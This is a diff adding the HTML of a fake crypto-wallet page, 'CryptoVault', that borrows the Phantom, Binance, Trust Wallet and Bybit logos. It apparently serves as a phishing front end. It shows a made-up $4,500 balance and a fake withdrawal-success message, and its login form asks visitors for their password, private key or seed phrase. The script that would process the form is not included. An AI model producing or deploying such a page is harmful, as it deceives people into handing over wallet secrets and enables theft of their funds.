@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Crypto Wallet - Secure Login</title>
+ <!-- Link to the CSS file you will create -->
+ <link rel="stylesheet" href="style.css">
+</head>
+<body>
+ <div class="app-container">
+ <!-- Header -->
+ <header class="app-header">
+ <div class="header-left">
+ <h1>CryptoVault</h1>
+ </div>
+ <div class="header-right">
+ <button class="icon-btn" id="settingsBtn">⚙️</button>
+ </div>
+ </header>
+
+ <!-- Main Balance Display -->
+ <main class="wallet-display">
+ <div class="crypto-identity">
+ <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Phantom_logo.svg/320px-Phantom_logo.svg.png" alt="Phantom Logo" id="walletLogo" class="wallet-logo">
+ <span id="walletName" class="wallet-name">Phantom Wallet</span>
+ </div>
+ 
+ <div class="balance-container">
+ <p class="balance-label">Total Balance</p>
+ <h2 class="balance-amount">$4,500.00</h2>
+ </div>
+
+ <!-- Action Buttons -->
+ <div class="actions">
+ <button class="action-btn primary" id="withdrawBtn">Withdraw</button>
+ <button class="action-btn secondary" id="depositBtn">Deposit</button>
+ </div>
+ </main>
+
+ <!-- Login Section (Hidden by default) -->
+ <section class="login-section" id="loginSection">
+ <h3>Connect Your Wallet</h3>
+ <p class="login-subtext">Select your wallet type to access your assets.</p>
+ 
+ <div class="wallet-options">
+ <button class="wallet-option phantom" data-type="phantom">
+ <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Phantom_logo.svg/320px-Phantom_logo.svg.png" alt="Phantom">
+ Phantom
+ </button>
+ <button class="wallet-option binance" data-type="binance">
+ <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/Binance-Logo.wine.svg/320px-Binance-Logo.wine.svg.png" alt="Binance">
+ Binance
+ </button>
+ <button class="wallet-option trust" data-type="trust">
+ <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Trust_Wallet_Logo_2020.svg/320px-Trust_Wallet_Logo_2020.svg.png" alt="Trust">
+ Trust Wallet
+ </button>
+ <button class="wallet-option bybit" data-type="bybit">
+ <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/Bybit_logo.svg/320px-Bybit_logo.svg.png" alt="Bybit">
+ Bybit
+ </button>
+ </div>
+
+ <form id="loginForm" class="login-form">
+ <div class="form-group">
+ <label for="loginEmail">Email / Username</label>
+ <input type="text" id="loginEmail" placeholder="Enter email or username">
+ </div>
+ 
+ <div class="form-group">
+ <label for="loginPass">Password / Private Key</label>
+ <input type="password" id="loginPass" placeholder="Enter password or seed phrase">
+ </div>
+
+ <div class="form-group">
+ <label for="walletType" style="display:none;">Selected Wallet</label>
+ <select id="walletType">
+ <option value="phantom">Phantom Wallet</option>
+ <option value="binance">Binance</option>
+ <option value="trust">Trust Wallet</option>
+ <option value="bybit">Bybit</option>
+ </select>
+ </div>
+
+ <button type="submit" class="btn-submit">Connect Wallet</button>
+ </form>
+ </section>
+
+ <!-- Withdraw Section (Hidden by default) -->
+ <section class="withdraw-section" id="withdrawSection">
+ <h3>Withdraw Funds</h3>
+ <div class="withdraw-details">
+ <p>Amount to withdraw:</p>
+ <input type="number" value="4500" class="withdraw-input">
+ <p>Destination Address:</p>
+ <input type="text" placeholder="Paste wallet address here">
+ </div>
+ <button class="btn-withdraw" id="confirmWithdrawBtn">Confirm Withdrawal</button>
+ </section>
+
+ <!-- Notification Toast -->
+ <div class="toast" id="toast">
+ <div class="toast-icon">✅</div>
+ <div class="toast-message">Withdrawal Successful! $4,500 sent.</div>
+ </div>
+ </div>
+
+ <!-- Link to the JS file you will create -->
+ <script src="script.js"></script>
+</body>
+  </html>
